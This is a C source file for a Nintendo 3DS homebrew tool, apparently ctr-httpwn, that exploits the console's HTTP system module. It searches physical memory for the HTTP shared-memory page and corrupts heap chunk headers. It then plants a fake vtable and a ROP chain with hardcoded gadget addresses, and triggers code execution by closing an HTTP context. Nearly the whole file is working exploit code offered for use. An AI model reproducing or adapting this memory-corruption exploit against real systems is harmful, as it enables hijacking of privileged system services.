#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <3ds.h>

#include "cmpblock_bin.h"

extern u32 *__httpc_sharedmem_addr;

void displaymessage_waitbutton()
{
	printf("\nPress the A button to continue.\n");
	while(1)
	{
		gspWaitForVBlank();
		hidScanInput();
		if(hidKeysDown() & KEY_A)break;
	}
}

//This searches physmem for the page which starts with the data stored in cmpblock_bin. The first byte in cmpblock is XORed with 0x01 to avoid detecting the cmpblock in physmem.
Result locate_sharedmem_linearaddr(u32 **linearaddr)
{
	u8 *tmpbuf;
	u32 chunksize = 0x100000;
	u32 linearpos, bufpos, size;
	u32 i;
	u32 xorval;
	int found = 0;

	*linearaddr = NULL;

	tmpbuf = linearAlloc(chunksize);
	if(tmpbuf==NULL)
	{
		printf("Failed to allocate mem for tmpbuf.\n");
		return -1;
	}

	size = osGetMemRegionSize(MEMREGION_APPLICATION);

	for(linearpos=0; linearpos<size; linearpos+= chunksize)
	{
		*linearaddr = (u32*)(0x30000000+linearpos);

		memset(tmpbuf, 0, chunksize);
		GSPGPU_FlushDataCache(tmpbuf, chunksize);

		GX_TextureCopy(*linearaddr, 0, (u32*)tmpbuf, 0, chunksize, 0x8);
		gspWaitForPPF();

		for(bufpos=0; bufpos<chunksize; bufpos+= 0x1000)
		{
			found = 1;

			for(i=0; i<cmpblock_bin_size; i++)
			{
				xorval = 0;
				if(i==0)xorval = 1;

				if(tmpbuf[bufpos + i] != (cmpblock_bin[i] ^ xorval))
				{
					found = 0;
					break;
				}
			}

			if(found)
			{
				*linearaddr = (u32*)(0x30000000+linearpos+bufpos);
				break;
			}
		}
		if(found)break;
	}

	linearFree(tmpbuf);

	if(!found)return -1;

	return 0;
}

void ropgen_addword(u32 **ropchain, u32 *http_ropvaddr, u32 value)
{
	u32 *ptr = *ropchain;

	*ptr = value;

	(*ropchain)++;
	(*http_ropvaddr)+=4;
}

void init_hax_sharedmem(u32 *tmpbuf)
{
	u32 sharedmembase = 0x10006000;
	u32 target_overwrite_addr;
	u32 object_addr = sharedmembase + 0x200;
	u32 *initialhaxobj = &tmpbuf[0x200>>2];
	u32 *haxobj1 = &tmpbuf[0x400>>2];
	u32 *ropchain = &tmpbuf[0x600>>2];
	u32 http_ropvaddr = sharedmembase+0x600;

	u32 ROP_LDRR4R5_R5x1b8_OBJVTABLECALLx8 = 0x0010264c;//Load r4 from r5+0x1b8 and r6 from r5+0x1bc. Set r0 to r4. Load the vtable addr + funcptr using just r1 and blx to r1(vtable funcptr +8).
	u32 ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 = 0x00114b30;//Load ip from r0+0(vtable ptr). Load r1 from r4+0xc, r2 from r4+0x14, and r3 from r4+0x4. Then load ip from ip+0x18(vtable+0x18) and blx to ip.
	u32 ROP_STACKPIVOT = 0x00107b08;//Add sp with r3 then pop-pc.
	u32 ROP_STACKPIVOT_POPR3 = ROP_STACKPIVOT-4;//"pop {r3}", then the code from ROP_STACKPIVOT.

	u32 ROP_POPR4R5R6PC = 0x00100248;//"pop {r4, r5, r6, pc}"

	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.

	target_overwrite_addr = closecontext_stackframe;
	target_overwrite_addr-= 0xc;//Subtract by this value to get the address of the saved r5 which will be popped.

	//Overwrite the prev/next memchunk ptrs in the CTRSDK freemem memchunkhdr following the allocated struct for the POST data.
	//Once the free() is finished, object_addr will be written to target_overwrite_addr, etc.
	tmpbuf[0x44>>2] = target_overwrite_addr - 0xc;
	tmpbuf[0x48>>2] = object_addr;

	//Once http-sysmodule returns into the actual-CloseContext-function, r5 will be overwritten with object_addr. Then it will eventually call vtable funcptr +4 with this object. Before doing so this CloseContext function will write val0 to the two words @ obj+8 and obj+4.

	initialhaxobj[0] = object_addr+0x100;//Set the vtable to sharedmem+0x300.
	initialhaxobj[1] = object_addr+4;//Set obj+4 to the addr of obj+4, so that most of the linked-list code is skipped over.
	tmpbuf[(0x300+4) >> 2] = ROP_LDRR4R5_R5x1b8_OBJVTABLECALLx8;//Set the funcptr @ vtable+4. This where the hax initially gets control of PC. Once this ROP finishes it will jump to ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 below.

	initialhaxobj[0x1b8>>2] = object_addr+0x200;//Set the addr of haxobj1 to sharedmem+0x400(this object is used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8).

	haxobj1[0] = sharedmembase+0x500;
	//Setup the regs loaded by ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18.
	haxobj1[0xc>>2] = 0;//r1
	haxobj1[0x14>>2] = 0;//r2
	haxobj1[0x4>>2] = (sharedmembase+0x600) - closecontext_stackframe;//r3

	//Init the vtable for haxobj1.
	tmpbuf[(0x500+8) >> 2] = ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18;//Init the funcptr used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8. Once this ROP finishes it will jump to ROP_STACKPIVOT.
	tmpbuf[(0x500+0x18) >> 2] = ROP_STACKPIVOT;//Stack-pivot to sharedmem+0x600.

	//Setup the actual ROP-chain.
	ropgen_addword(&ropchain, &http_ropvaddr, 0x58584148);
	ropgen_addword(&ropchain, &http_ropvaddr, 0x40404040);
}

Result writehax_sharedmem_physmem(u32 *linearaddr)
{
	u32 chunksize = 0x1000;
	u32 *tmpbuf;

	//Allocate memory for the sharedmem page, then copy the sharedmem physmem data into the buf.

	tmpbuf = linearAlloc(chunksize);
	if(tmpbuf==NULL)
	{
		printf("Failed to allocate mem for tmpbuf.\n");
		return -1;
	}

	memset(tmpbuf, 0, chunksize);
	GSPGPU_FlushDataCache(tmpbuf, chunksize);

	GX_TextureCopy(linearaddr, 0, tmpbuf, 0, chunksize, 0x8);
	gspWaitForPPF();

	init_hax_sharedmem(tmpbuf);

	//Flush dcache for the modified sharedmem, then copy the data back into the sharedmem physmem.
	GSPGPU_FlushDataCache(tmpbuf, chunksize);

	GX_TextureCopy(tmpbuf, 0, linearaddr, 0, chunksize, 0x8);
	gspWaitForPPF();

	linearFree(tmpbuf);

	return 0;
}

Result http_haxx(char *requrl)
{
	Result ret=0;
	httpcContext context;
	u32 *linearaddr = NULL;

	ret = httpcOpenContext(&context, HTTPC_METHOD_POST, requrl, 1);
	if(ret!=0)return ret;

	ret = httpcAddPostDataAscii(&context, "form_name", "form_value");
	if(ret!=0)
	{
		httpcCloseContext(&context);
		return ret;
	}

	//Locate the physmem for the httpc sharedmem. With the current cmpblock, there can only be one POST struct that was ever written into sharedmem, with the name/value from above.
	printf("Searching for the httpc sharedmem in physmem...\n");
	ret = locate_sharedmem_linearaddr(&linearaddr);
	if(ret!=0)
	{
		printf("Failed to locate the sharedmem in physmem.\n");
		httpcCloseContext(&context);
		return ret;
	}

	printf("Successfully located the linearaddr for sharedmem: 0x%08x.\n", (unsigned int)linearaddr);

	printf("Writing the haxx to physmem...\n");
	ret = writehax_sharedmem_physmem(linearaddr);
	if(ret!=0)
	{
		printf("Failed to setup the haxx.\n");
		httpcCloseContext(&context);
		return ret;
	}

	printf("Triggering the haxx...\n");
	ret = httpcCloseContext(&context);
	if(R_FAILED(ret))
	{
		printf("httpcCloseContext returned 0x%08x.\n", (unsigned int)ret);
		if(ret==0xC920181A)printf("This error means the HTTP sysmodule crashed.\n");
	}

	return 0;
}

Result httpwn_setup()
{
	Result ret = 0;
	u64 http_sysmodule_titleid = 0x0004013000002902ULL;
	AM_TitleEntry title_entry;

	ret = amInit();
	if(ret!=0)
	{
		printf("Failed to initialize AM: 0x%08x.\n", (unsigned int)ret);
		if(ret==0xd8e06406)
		{
			printf("The AM service is inaccessible. With the *hax payloads this should never happen. This is normal with plain ninjhax v1.x: this app isn't usable from ninjhax v1.x without any further hax.\n");
		}
		return ret;
	}

	ret = AM_ListTitles(0, 1, &http_sysmodule_titleid, &title_entry);
	amExit();
	if(ret!=0)
	{
		printf("Failed to get the HTTP sysmodule title-version: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}

	if(title_entry.version != 13318)
	{
		printf("The installed HTTP sysmodule version(v%u) is not supported. The sysmodule version must be the version from system-version >=9.6.0-X.\n", title_entry.version);
		return -1;
	}

	ret = httpcInit(0x1000);
	if(ret!=0)
	{
		printf("Failed to initialize HTTPC: 0x%08x.\n", (unsigned int)ret);
		if(ret==0xd8e06406)
		{
			printf("The HTTPC service is inaccessible. With the *hax payload this may happen if the process this app is running under doesn't have access to that service. Please try rebooting the system, boot *hax payload, then directly launch the app.\n");
		}

		return ret;
	}

	printf("Preparing the haxx...\n");
	ret = http_haxx("http://localhost/");//URL doesn't matter much since this won't actually be requested over the network.
	httpcExit();
	if(ret!=0)
	{
		printf("HTTP request failed: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}

	return ret;
}

int main(int argc, char **argv)
{
	Result ret = 0;

	// Initialize services
	gfxInitDefault();

	consoleInit(GFX_TOP, NULL);

	printf("ctr-httpwn %s by yellows8.\n", VERSION);

	ret = httpwn_setup();

	if(ret!=0)printf("An error occured. If this is an actual issue not related to user failure, please report this to here if it persists(or comment on an already existing issue if needed), with a screenshot: https://github.com/yellows8/ctr-httpwn /issues\n");

	printf("Press the START button to exit.\n");
	// Main loop
	while (aptMainLoop())
	{
		gspWaitForVBlank();
		hidScanInput();

		u32 kDown = hidKeysDown();
		if (kDown & KEY_START)
			break; // break in order to return to hbmenu
	}

	// Exit services
	gfxExit();
	return 0;
}

